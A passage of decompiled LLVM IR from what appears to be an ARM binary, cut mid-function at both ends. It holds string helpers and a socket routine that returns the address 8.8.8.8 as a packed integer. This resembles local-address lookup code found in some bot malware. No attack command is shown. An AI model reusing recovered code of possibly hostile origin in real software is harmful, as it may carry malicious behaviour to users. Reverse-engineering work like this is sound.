  %v1_10360 = inttoptr i32 %v5_10254 to i8*
  %v2_10360 = load i8, i8* %v1_10360, align 1
  %v3_10360 = zext i8 %v2_10360 to i32
  store i32 %v3_10360, i32* @r4, align 4
  %v5_10360 = add i32 %v0_10254, 2
  store i32 %v5_10360, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10288

dec_label_pc_10370:                               ; preds = %dec_label_pc_10344
  br i1 %v2_10370, label %.thread32, label %bb61

.thread32:                                        ; preds = %dec_label_pc_10370
  br label %bb60

bb61:                                             ; preds = %dec_label_pc_10370
  br label %bb60

; uselistorder directives
  uselistorder i1 %v2_10370, { 1, 0 }
  uselistorder i32 %v2_1031c, { 1, 0 }
  uselistorder i32 %v1_1031c, { 1, 0, 2 }
  uselistorder i32 %v2_102f4, { 1, 0 }
  uselistorder i32 %v3_1032c, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_102cc, { 1, 2, 0 }
  uselistorder i1 %v2_102cc, { 1, 0, 2 }
  uselistorder i32 %v1_102b0, { 1, 2, 0 }
  uselistorder i32 %v1_102f0, { 1, 2, 0 }
  uselistorder i32 %v1_10308, { 1, 0 }
  uselistorder i1 %v9_102fc, { 1, 0, 2 }
  uselistorder i1 %v3_102fc, { 1, 0 }
  uselistorder i32 %v2_1032c.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_102a0, { 1, 0 }
  uselistorder i32 %v5_10254, { 3, 4, 5, 2, 1, 0 }
  uselistorder i8 %v2_10254, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_10254, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 4, 3, 6, 7 }
  uselistorder i32 25, { 20, 21, 5, 12, 2, 11, 3, 13, 4, 14, 10, 6, 15, 0, 16, 7, 8, 17, 9, 18, 1, 19 }
  uselistorder i8 32, { 9, 10, 11, 0, 12, 13, 1, 2, 14, 3, 4, 5, 6, 7, 8 }
  uselistorder i8 9, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %bb60, { 1, 0, 3, 2 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %dec_label_pc_102f4, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_102b0, { 1, 0 }
  uselistorder label %dec_label_pc_10288, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10254, { 1, 2, 0, 3 }
}

define i32 @function_10380(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10380:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10380 = load i32, i32* @r4, align 4
  store i32 %v3_10380, i32* %stack_var_-24, align 4
  %v12_10380 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10398

dec_label_pc_10398:                               ; preds = %dec_label_pc_103bc.dec_label_pc_10398_crit_edge, %dec_label_pc_10380
  %v0_1039c = phi i32 [ %v0_1039c.pre, %dec_label_pc_103bc.dec_label_pc_10398_crit_edge ], [ %arg3, %dec_label_pc_10380 ]
  %v1_103a4 = call i32 @function_10978(i32 %v0_1039c)
  %v7_103a8 = icmp eq i32 %v1_103a4, 1
  %v0_103b0 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_103a8, label %dec_label_pc_103b0, label %dec_label_pc_103c8

dec_label_pc_103b0:                               ; preds = %dec_label_pc_10398
  %v1_103b0 = add i32 %v0_103b0, 1
  store i32 %v1_103b0, i32* %r5.global-to-local, align 4
  %v1_103b4 = load i32, i32* %r8.global-to-local, align 4
  %v6_103b8 = icmp slt i32 %v1_103b0, %v1_103b4
  br i1 %v6_103b8, label %dec_label_pc_103bc, label %.loopexit

dec_label_pc_103bc:                               ; preds = %dec_label_pc_103b0
  %v0_103bc = load i32, i32* %r4.global-to-local, align 4
  %v1_103bc = inttoptr i32 %v0_103bc to i8*
  %v2_103bc = load i8, i8* %v1_103bc, align 1
  %v5_103bc = add i32 %v0_103bc, 1
  store i32 %v5_103bc, i32* %r4.global-to-local, align 4
  %v7_103c0 = icmp eq i8 %v2_103bc, 10
  br i1 %v7_103c0, label %dec_label_pc_103c8, label %dec_label_pc_103bc.dec_label_pc_10398_crit_edge

dec_label_pc_103bc.dec_label_pc_10398_crit_edge:  ; preds = %dec_label_pc_103bc
  %v0_1039c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10398

dec_label_pc_103c8:                               ; preds = %dec_label_pc_10398, %dec_label_pc_103bc
  %v0_103c8 = phi i32 [ %v1_103b0, %dec_label_pc_103bc ], [ %v0_103b0, %dec_label_pc_10398 ]
  %v2_103c8 = icmp eq i32 %v0_103c8, 0
  br i1 %v2_103c8, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_103c8
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_103b0, %dec_label_pc_103c8, %bb
  %v0_103d0 = load i32, i32* @r7, align 4
  %v2_103d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_103d4, i32* @r4, align 4
  store i32 %v12_10380, i32* @r7, align 4
  ret i32 %v0_103d0

; uselistorder directives
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_103c8, { 1, 0 }
}

define i32 @function_103dc() local_unnamed_addr {
dec_label_pc_103dc:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_103ec = call i32 @function_11008()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_103f4 = inttoptr i32 %v0_103ec to i32*
  store i32 0, i32* %v2_103f4, align 4
  %v0_10400 = load i32, i32* %r4.global-to-local, align 4
  %v3_10404 = call i32 @function_113bc(i32 2, i32 2, i32 %v0_10400)
  %v7_10408 = icmp eq i32 %v3_10404, -1
  store i32 %v3_10404, i32* %r5.global-to-local, align 4
  br i1 %v7_10408, label %bb, label %dec_label_pc_10418

bb:                                               ; preds = %dec_label_pc_103dc
  %v1_10410 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10464

dec_label_pc_10418:                               ; preds = %dec_label_pc_103dc
  %v2_10424 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10424, i32* %r4.global-to-local, align 4
  %v0_10430 = load i32, i32* %r6.global-to-local, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10444 = call i32 @function_111a4(i32 %v3_10404, i32 %v2_10424, i32 %v0_10430)
  %v2_1044c = ptrtoint i32* %stack_var_-20 to i32
  %v0_10450 = load i32, i32* %r5.global-to-local, align 4
  %v3_10454 = call i32 @function_111dc(i32 %v0_10450, i32 %v2_10424, i32 %v2_1044c)
  %v1_1045c = call i32 @function_10be0(i32 %v0_10450)
  br label %dec_label_pc_10464

dec_label_pc_10464:                               ; preds = %bb, %dec_label_pc_10418
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10418 ], [ %v1_10410, %bb ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_10404, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_111a4, { 7, 8, 6, 5, 4, 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_113bc, { 25, 26, 23, 24, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 3, 2, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_10464, { 1, 0 }
}

define i32 @function_10470(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10470:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10474 = load i8, i8* %tmp, align 1
  %v2_10478 = icmp eq i8 %v3_10474, 0
  br i1 %v2_10478, label %bb, label %dec_label_pc_1048c

bb:                                               ; preds = %dec_label_pc_10470
  %v4_10474 = zext i8 %v3_10474 to i32
  br label %dec_label_pc_104a0

dec_label_pc_1048c:                               ; preds = %dec_label_pc_10470
  br label %dec_label_pc_10490

dec_label_pc_10490:                               ; preds = %dec_label_pc_10490, %dec_label_pc_1048c
  %v0_10490 = phi i32 [ %v1_10490, %dec_label_pc_10490 ], [ 0, %dec_label_pc_1048c ]
  %v1_10490 = add i32 %v0_10490, 1
  %v2_10494 = add i32 %v1_10490, %arg2
  %v3_10494 = inttoptr i32 %v2_10494 to i8*
  %v4_10494 = load i8, i8* %v3_10494, align 1
  %v2_10498 = icmp eq i8 %v4_10494, 0
  br i1 %v2_10498, label %dec_label_pc_104a0, label %dec_label_pc_10490

dec_label_pc_104a0:                               ; preds = %dec_label_pc_10490, %bb
  %v0_104e421 = phi i32 [ %v4_10474, %bb ], [ %v1_10490, %dec_label_pc_10490 ]
  %v0_104a82 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_104a82, 1
  br i1 %tmp29, label %dec_label_pc_104f8, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %dec_label_pc_104a0, %dec_label_pc_104a8.backedge
  %v0_104ac.in = phi i32 [ %v0_104ac, %dec_label_pc_104a8.backedge ], [ %v0_104a82, %dec_label_pc_104a0 ]
  %v1_104c0 = phi i32 [ %v1_104c015, %dec_label_pc_104a8.backedge ], [ 0, %dec_label_pc_104a0 ]
  %v0_104b4 = phi i32 [ %v5_104b4, %dec_label_pc_104a8.backedge ], [ %tmp23, %dec_label_pc_104a0 ]
  %v0_104ac = add i32 %v0_104ac.in, -1
  %v1_104b4 = inttoptr i32 %v0_104b4 to i8*
  %v2_104b4 = load i8, i8* %v1_104b4, align 1
  %v3_104b4 = zext i8 %v2_104b4 to i32
  %v5_104b4 = add i32 %v0_104b4, 1
  %v1_104b8 = add nsw i32 %v3_104b4, -65
  %v2_104c0 = add i32 %v1_104c0, %arg2
  %v3_104c0 = inttoptr i32 %v2_104c0 to i8*
  %v4_104c0 = load i8, i8* %v3_104c0, align 1
  %v6_104c0 = zext i8 %v4_104c0 to i32
  %v1_104c4 = add nsw i32 %v6_104c0, -65
  %tmp38 = icmp ult i32 %v1_104b8, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_104b4
  %v5_104c8 = or i32 %v3_104b4, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_104b4, %bb30
  %v0_104d4 = phi i32 [ %v3_104b4, %dec_label_pc_104b4 ], [ %v5_104c8, %bb30 ]
  %tmp39 = icmp ult i32 %v1_104c4, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_104d0 = or i32 %v6_104c0, 96
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_104d4 = phi i32 [ %v6_104c0, %bb31 ], [ %v5_104d0, %bb32 ]
  %v9_104d4 = icmp eq i32 %v0_104d4, %v1_104d4
  br i1 %v9_104d4, label %dec_label_pc_104e0, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_104a8.backedge

dec_label_pc_104a8.backedge:                      ; preds = %bb34, %dec_label_pc_104e0
  %v1_104c015 = phi i32 [ 0, %bb34 ], [ %v1_104e0, %dec_label_pc_104e0 ]
  %tmp35 = icmp slt i32 %v0_104ac, 1
  br i1 %tmp35, label %dec_label_pc_104f8, label %dec_label_pc_104b4

dec_label_pc_104e0:                               ; preds = %bb33
  %v1_104e0 = add i32 %v1_104c0, 1
  %v9_104e4 = icmp eq i32 %v0_104e421, %v1_104e0
  br i1 %v9_104e4, label %dec_label_pc_104ec, label %dec_label_pc_104a8.backedge

dec_label_pc_104ec:                               ; preds = %dec_label_pc_104e0
  %v2_104ec = sub i32 %v5_104b4, %tmp23
  br label %dec_label_pc_104f8

dec_label_pc_104f8:                               ; preds = %dec_label_pc_104a8.backedge, %dec_label_pc_104a0, %dec_label_pc_104ec
  %storemerge = phi i32 [ %v2_104ec, %dec_label_pc_104ec ], [ -1, %dec_label_pc_104a0 ], [ -1, %dec_label_pc_104a8.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_104e0, { 1, 0 }
  uselistorder i32 %v0_104b4, { 1, 0 }
  uselistorder i32 %v1_104c0, { 1, 0 }
  uselistorder i8 %v3_10474, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 7, 6, 8, 3, 9, 4, 10, 5, 11, 12 }
  uselistorder label %dec_label_pc_104f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_104a8.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_104b4, { 1, 0 }
}

define i32 @function_10500(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10500:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10500 = load i8, i8* %arg1, align 1
  %v2_10504 = icmp eq i8 %v2_10500, 0
  br i1 %v2_10504, label %bb, label %dec_label_pc_10510

bb:                                               ; preds = %dec_label_pc_10500
  %v3_10500 = zext i8 %v2_10500 to i32
  br label %dec_label_pc_10524

dec_label_pc_10510:                               ; preds = %dec_label_pc_10500
  br label %dec_label_pc_10514

dec_label_pc_10514:                               ; preds = %dec_label_pc_10514, %dec_label_pc_10510
  %v0_10514 = phi i32 [ %v1_10514, %dec_label_pc_10514 ], [ 0, %dec_label_pc_10510 ]
  %v1_10514 = add i32 %v0_10514, 1
  %v2_10518 = add i32 %v1_10514, %tmp
  %v3_10518 = inttoptr i32 %v2_10518 to i8*
  %v4_10518 = load i8, i8* %v3_10518, align 1
  %v2_1051c = icmp eq i8 %v4_10518, 0
  br i1 %v2_1051c, label %dec_label_pc_10524, label %dec_label_pc_10514

dec_label_pc_10524:                               ; preds = %dec_label_pc_10514, %bb
  %v0_105703 = phi i32 [ %v3_10500, %bb ], [ %v1_10514, %dec_label_pc_10514 ]
  %v1_10524 = inttoptr i32 %arg2 to i8*
  %v2_10524 = load i8, i8* %v1_10524, align 1
  %v3_10524 = zext i8 %v2_10524 to i32
  store i32 %v3_10524, i32* @r3, align 4
  %v2_10528 = icmp eq i8 %v2_10524, 0
  br i1 %v2_10528, label %bb21, label %dec_label_pc_10534

bb21:                                             ; preds = %dec_label_pc_10524
  store i32 %v3_10524, i32* @r2, align 4
  br label %dec_label_pc_10548

dec_label_pc_10534:                               ; preds = %dec_label_pc_10524
  br label %dec_label_pc_10538

dec_label_pc_10538:                               ; preds = %dec_label_pc_10538, %dec_label_pc_10534
  %v0_10538 = phi i32 [ %v1_10538, %dec_label_pc_10538 ], [ 0, %dec_label_pc_10534 ]
  %v1_10538 = add i32 %v0_10538, 1
  store i32 %v1_10538, i32* @r2, align 4
  %v2_1053c = add i32 %v1_10538, %arg2
  %v3_1053c = inttoptr i32 %v2_1053c to i8*
  %v4_1053c = load i8, i8* %v3_1053c, align 1
  %v6_1053c = zext i8 %v4_1053c to i32
  store i32 %v6_1053c, i32* @r3, align 4
  %v2_10540 = icmp eq i8 %v4_1053c, 0
  br i1 %v2_10540, label %dec_label_pc_10548, label %dec_label_pc_10538

dec_label_pc_10548:                               ; preds = %dec_label_pc_10538, %bb21
  %v0_10548 = phi i32 [ %v3_10524, %bb21 ], [ %v1_10538, %dec_label_pc_10538 ]
  %v9_10548 = icmp eq i32 %v0_10548, %v0_105703
  br i1 %v9_10548, label %dec_label_pc_10570.preheader, label %dec_label_pc_10550

dec_label_pc_10570.preheader:                     ; preds = %dec_label_pc_10548
  %v2_105705 = icmp eq i32 %v0_105703, 0
  br i1 %v2_105705, label %dec_label_pc_10578, label %dec_label_pc_10558

dec_label_pc_10550:                               ; preds = %dec_label_pc_10558, %dec_label_pc_10548
  ret i32 0

dec_label_pc_10558:                               ; preds = %dec_label_pc_10568, %dec_label_pc_10570.preheader
  %v0_10570.in = phi i32 [ %v0_10570, %dec_label_pc_10568 ], [ %v0_105703, %dec_label_pc_10570.preheader ]
  %v0_1056c = phi i32 [ %v1_1056c, %dec_label_pc_10568 ], [ %arg2, %dec_label_pc_10570.preheader ]
  %v0_10568 = phi i32 [ %v1_10568, %dec_label_pc_10568 ], [ %tmp, %dec_label_pc_10570.preheader ]
  %v0_10570 = add i32 %v0_10570.in, -1
  %v1_10558 = inttoptr i32 %v0_10568 to i8*
  %v2_10558 = load i8, i8* %v1_10558, align 1
  %v3_10558 = zext i8 %v2_10558 to i32
  store i32 %v3_10558, i32* @r2, align 4
  %v1_1055c = inttoptr i32 %v0_1056c to i8*
  %v2_1055c = load i8, i8* %v1_1055c, align 1
  %v3_1055c = zext i8 %v2_1055c to i32
  store i32 %v3_1055c, i32* @r3, align 4
  %v9_10560 = icmp eq i8 %v2_10558, %v2_1055c
  br i1 %v9_10560, label %dec_label_pc_10568, label %dec_label_pc_10550

dec_label_pc_10568:                               ; preds = %dec_label_pc_10558
  %v1_10568 = add i32 %v0_10568, 1
  %v1_1056c = add i32 %v0_1056c, 1
  %v2_10570 = icmp eq i32 %v0_10570, 0
  br i1 %v2_10570, label %dec_label_pc_10578, label %dec_label_pc_10558

dec_label_pc_10578:                               ; preds = %dec_label_pc_10568, %dec_label_pc_10570.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10538, { 0, 1, 3, 2 }
  uselistorder i8 %v2_10500, { 1, 0 }
}

define i32 @function_10580(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10580:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v3_10580 = load i32, i32* @r4, align 4
  %v12_10580 = load i32, i32* @r7, align 4
  %v0_10584 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10584, i32* %r8.global-to-local, align 4
  %v2_10584 = icmp eq i32 %v0_10584, 0
  store i1 %v2_10584, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_10584, label %dec_label_pc_10664, label %dec_label_pc_10594

dec_label_pc_10594:                               ; preds = %dec_label_pc_10580
  %v3_10594 = icmp eq i8 %arg1, 0
  store i1 %v3_10594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10594, label %.thread, label %dec_label_pc_105a8

.thread:                                          ; preds = %dec_label_pc_10594
  %v4_1059c = inttoptr i32 %v0_10584 to i8*
  store i8 48, i8* %v4_1059c, align 1
  %v0_105a0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_105a0.pr.pr, label %.thread1, label %dec_label_pc_105a8

.thread1:                                         ; preds = %.thread
  %v4_105a0 = load i32, i32* %r8.global-to-local, align 4
  %v5_105a0 = add i32 %v4_105a0, 1
  %v6_105a0 = inttoptr i32 %v5_105a0 to i8*
  store i8 0, i8* %v6_105a0, align 1
  %v0_105a4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_105a4.pr.pr, label %dec_label_pc_10664, label %dec_label_pc_105a8

dec_label_pc_105a8:                               ; preds = %dec_label_pc_10594, %.thread, %.thread1
  %tmp47 = icmp slt i8 %arg1, 0
  %v7_105ac = icmp eq i32 %arg2, 10
  store i1 %v7_105ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_105ac, label %bb, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_105a8
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_105a8
  %v4_105a8 = zext i1 %tmp47 to i32
  store i32 %v4_105a8, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp47, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_105cc8 = sub nsw i32 0, %tmp
  %tmp.v3_105cc8 = select i1 %phitmp, i32 %tmp, i32 %v3_105cc8
  %tmp46 = zext i1 %phitmp to i32
  %. = xor i32 %tmp46, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread28
  %storemerge30 = phi i32 [ %tmp, %.thread28 ], [ %tmp.v3_105cc8, %bb ]
  %storemerge = phi i32 [ 0, %.thread28 ], [ %., %bb ]
  store i32 %storemerge30, i32* @r4, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_105d8 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_105d8, i32* @r7, align 4
  br label %dec_label_pc_105dc

dec_label_pc_105dc:                               ; preds = %bb45, %.thread6
  %v0_105dc = phi i32 [ %v0_10600, %bb45 ], [ %storemerge30, %.thread6 ]
  store i32 %v0_105dc, i32* %r0.global-to-local, align 4
  %v0_105e0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_105e0, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_105dc, 16777216
  %v1_105e4 = sdiv i32 %sext, 16777216
  %v3_105e4 = call i32 @function_10778(i32 %v1_105e4, i32 %v0_105e0)
  %v7_105e8 = icmp eq i32 %v0_105e0, 9
  store i1 %v7_105e8, i1* %cpsr_z.global-to-local, align 1
  %v1_105ec = add i32 %v0_105e0, 48
  %v0_105f0 = load i32, i32* @r4, align 4
  store i32 %v0_105f0, i32* @r0, align 4
  %v7_105f4 = icmp sgt i32 %v0_105e0, 9
  %extract.t = trunc i32 %v1_105ec to i8
  br i1 %v7_105f4, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_105dc
  %v9_105f4 = add i32 %v0_105e0, 55
  %extract.t27 = trunc i32 %v9_105f4 to i8
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_105dc, %bb44
  %v0_105fc.off0 = phi i8 [ %extract.t, %dec_label_pc_105dc ], [ %extract.t27, %bb44 ]
  %v0_105f8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_105f8, i32* @r1, align 4
  %v2_105fc = load i32, i32* %r5.global-to-local, align 4
  %v3_105fc = load i32, i32* @r7, align 4
  %v4_105fc = add i32 %v3_105fc, %v2_105fc
  %v5_105fc = inttoptr i32 %v4_105fc to i8*
  store i8 %v0_105fc.off0, i8* %v5_105fc, align 1
  %v0_10600 = call i32 @function_1067c()
  store i32 %v0_10600, i32* %r0.global-to-local, align 4
  store i32 %v0_10600, i32* @r4, align 4
  %v2_10604 = icmp eq i32 %v0_10600, 0
  store i1 %v2_10604, i1* %cpsr_z.global-to-local, align 1
  %v0_10608 = load i32, i32* %r5.global-to-local, align 4
  %v1_10608 = add i32 %v0_10608, -1
  store i32 %v1_10608, i32* %r5.global-to-local, align 4
  br i1 %v2_10604, label %dec_label_pc_10610, label %dec_label_pc_105dc

dec_label_pc_10610:                               ; preds = %bb45
  %v0_10610 = load i32, i32* %sl.global-to-local, align 4
  %v2_10610 = icmp eq i32 %v0_10610, 0
  store i1 %v2_10610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10610, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_10610
  %v3_10614 = ptrtoint i32* %stack_var_-32 to i32
  %v3_10618 = add i32 %v1_10608, %v3_10614
  store i32 %v3_10618, i32* %r2.global-to-local, align 4
  %v4_10620 = add i32 %v3_10618, -34
  %v5_10620 = inttoptr i32 %v4_10620 to i8*
  store i8 45, i8* %v5_10620, align 1
  %v0_10624.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10624.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_10624.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_10610
  %v1_10624 = phi i32 [ %v1_10608, %dec_label_pc_10610 ], [ %v1_10624.pre, %.thread11 ]
  %v2_10624 = add i32 %v1_10624, 1
  store i32 %v2_10624, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_10630 = phi i32 [ %v2_10624, %.thread12 ], [ %v1_10624.pre, %.thread11 ]
  %v0_10628 = load i32, i32* @r7, align 4
  %v2_10628 = add i32 %v0_10628, %v1_10630
  %v3_10628 = inttoptr i32 %v2_10628 to i8*
  %v4_10628 = load i8, i8* %v3_10628, align 1
  %v6_10628 = zext i8 %v4_10628 to i32
  %v2_1062c = icmp eq i8 %v4_10628, 0
  store i1 %v2_1062c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10628, i32* %r2.global-to-local, align 4
  br i1 %v2_1062c, label %dec_label_pc_10674, label %dec_label_pc_1063c.preheader

dec_label_pc_1063c.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1063c

dec_label_pc_1063c:                               ; preds = %dec_label_pc_1063c.preheader, %dec_label_pc_1063c
  %v0_1063c = phi i32 [ 0, %dec_label_pc_1063c.preheader ], [ %v1_1063c, %dec_label_pc_1063c ]
  %v1_1063c = add i32 %v0_1063c, 1
  store i32 %v1_1063c, i32* %r1.global-to-local, align 4
  %v2_10640 = add i32 %v1_1063c, %v2_10628
  %v3_10640 = inttoptr i32 %v2_10640 to i8*
  %v4_10640 = load i8, i8* %v3_10640, align 1
  %v2_10644 = icmp eq i8 %v4_10640, 0
  store i1 %v2_10644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10644, label %dec_label_pc_1064c, label %dec_label_pc_1063c

dec_label_pc_1064c:                               ; preds = %dec_label_pc_1063c, %dec_label_pc_10674
  %v0_1065024 = phi i32 [ %v6_10628, %dec_label_pc_10674 ], [ %v1_1063c, %dec_label_pc_1063c ]
  %v0_1064c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1064c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10650

dec_label_pc_10650:                               ; preds = %dec_label_pc_10650.dec_label_pc_10650_crit_edge, %dec_label_pc_1064c
  %v2_1065c = phi i32 [ %v5_1065c, %dec_label_pc_10650.dec_label_pc_10650_crit_edge ], [ %v0_1064c, %dec_label_pc_1064c ]
  %v0_10654 = phi i32 [ %v0_10654.pre, %dec_label_pc_10650.dec_label_pc_10650_crit_edge ], [ %v2_10628, %dec_label_pc_1064c ]
  %v0_10650 = phi i32 [ %v0_10650.pre, %dec_label_pc_10650.dec_label_pc_10650_crit_edge ], [ %v0_1065024, %dec_label_pc_1064c ]
  %v1_10650 = add i32 %v0_10650, -1
  store i32 %v1_10650, i32* %r1.global-to-local, align 4
  %v1_10654 = inttoptr i32 %v0_10654 to i8*
  %v2_10654 = load i8, i8* %v1_10654, align 1
  %v5_10654 = add i32 %v0_10654, 1
  store i32 %v5_10654, i32* %r2.global-to-local, align 4
  %v3_10658 = icmp eq i32 %v0_10650, 0
  store i1 %v3_10658, i1* %cpsr_z.global-to-local, align 1
  %v3_1065c = inttoptr i32 %v2_1065c to i8*
  store i8 %v2_10654, i8* %v3_1065c, align 1
  %v4_1065c = load i32, i32* %r0.global-to-local, align 4
  %v5_1065c = add i32 %v4_1065c, 1
  store i32 %v5_1065c, i32* %r0.global-to-local, align 4
  br i1 %v3_10658, label %dec_label_pc_10664, label %dec_label_pc_10650.dec_label_pc_10650_crit_edge

dec_label_pc_10650.dec_label_pc_10650_crit_edge:  ; preds = %dec_label_pc_10650
  %v0_10650.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_10654.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10650

dec_label_pc_10664:                               ; preds = %dec_label_pc_10650, %.thread1, %dec_label_pc_10580
  %v0_10664 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10664, i32* %r0.global-to-local, align 4
  store i32 %v3_10580, i32* @r4, align 4
  store i32 %v12_10580, i32* @r7, align 4
  ret i32 %v0_10664

dec_label_pc_10674:                               ; preds = %.thread11._crit_edge
  store i32 %v6_10628, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1064c

; uselistorder directives
  uselistorder i32 %v5_1065c, { 1, 0 }
  uselistorder i1 %v3_10658, { 1, 0 }
  uselistorder i32 %v0_10654, { 1, 0 }
  uselistorder i32 %v1_1063c, { 0, 1, 3, 2 }
  uselistorder i32 %v6_10628, { 1, 0 }
  uselistorder i32 %v2_10628, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10624.pre, { 1, 0 }
  uselistorder i32 %v1_10608, { 1, 0, 2 }
